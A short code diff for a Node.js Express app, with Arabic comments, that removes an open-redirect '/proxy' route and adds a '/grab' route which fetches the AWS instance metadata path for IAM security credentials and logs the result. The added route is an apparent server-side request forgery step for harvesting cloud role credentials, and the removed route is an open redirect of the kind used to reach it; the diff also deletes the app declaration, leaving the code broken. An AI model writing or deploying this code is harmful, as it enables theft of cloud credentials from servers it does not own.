@@ -1,11 +1,8 @@
-const express = require('express');
-const app = express();
+app.get('/grab', async (req, res) => {
+  const sensitiveUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+  const response = await fetch(sensitiveUrl);
+  const text = await response.text();
+  console.log("Metadata:", text); // يطبع لك اسم الـ Role
 
-app.get('/proxy', (req, res) => {
-  const target = req.query.url;
-  res.redirect(302, target);  // هذا يسوي redirect مباشر
-});
-
-app.listen(10000, () => {
-  console.log('Server listening on port 10000');
+  res.send("Done");
 });
